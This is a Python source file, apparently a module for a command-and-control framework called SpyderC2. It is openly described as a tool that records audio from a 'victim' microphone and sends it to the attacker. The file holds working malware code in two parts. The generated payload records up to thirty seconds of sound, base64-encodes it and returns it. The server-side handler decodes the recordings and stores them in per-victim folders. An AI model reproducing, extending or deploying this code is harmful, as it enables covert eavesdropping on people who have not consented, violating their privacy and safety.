import sys
import os
import pathlib
import time
import base64
sys.path.append(os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../lib'))

from module import Module

class Audio(Module):
    description = 'Records audio from the victim microphone for a specified duration and sends it to the attacker.'

    @classmethod
    def module_options(cls):
        h = {
            'duration': {'desc': 'Recording duration in seconds. Maximum 30 seconds. Default is 5.', 'required': False},
            'path': {'desc': 'Directory on the attacker machine where the audio file is saved. Default is shared/victim_data/<victim_id>.', 'required': False}
        }
        return h

    def __init__(self, name, utility, language, options):
        super(Audio, self).__init__(name, self.description, utility, language, getattr(self, f"script_{language}")(options))

    def handle_task_output(self, data, options, victim_id, task_id):
        dump_path = os.path.join(str(pathlib.Path(__file__).parent.resolve()), '../../shared/victim_data', victim_id)
        if not os.path.exists(dump_path):
            os.makedirs(dump_path)

        filename = f"audio_{time.strftime('%Y%m%d-%H%M%S')}_{task_id}.wav"
        file_path = os.path.join(dump_path, filename)

        if 'path' in options:
            if os.path.exists(options['path']):
                file_path = os.path.join(options['path'], filename)

        if not os.access(os.path.dirname(file_path), os.W_OK):
            dump_path = os.path.join('/tmp', 'SpyderC2', victim_id)
            if not os.path.exists(dump_path):
                os.makedirs(dump_path, exist_ok=True)
            file_path = os.path.join(dump_path, filename)

        decoded = base64.b64decode(data)
        with open(file_path, 'wb') as f:
            f.write(decoded)

        return file_path

    def script_python(self, options):
        duration = int(options.get('duration', 5))
        if duration > 30:
            duration = 30

        return f"""def execute_command():
    import sounddevice as sd
    import scipy.io.wavfile as wav
    import base64
    import tempfile
    import os
    import numpy as np

    duration = {duration}
    sample_rate = 44100

    try:
        recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=1, dtype='int16')
        sd.wait()
    except Exception as e:
        return base64.b64encode(f'ERROR: {{str(e)}}'.encode()).decode()

    tmp = tempfile.NamedTemporaryFile(suffix='.wav', delete=False)
    wav.write(tmp.name, sample_rate, recording)
    tmp.close()

    with open(tmp.name, 'rb') as f:
        encoded = base64.b64encode(f.read()).decode()
    os.remove(tmp.name)
    return encoded
"""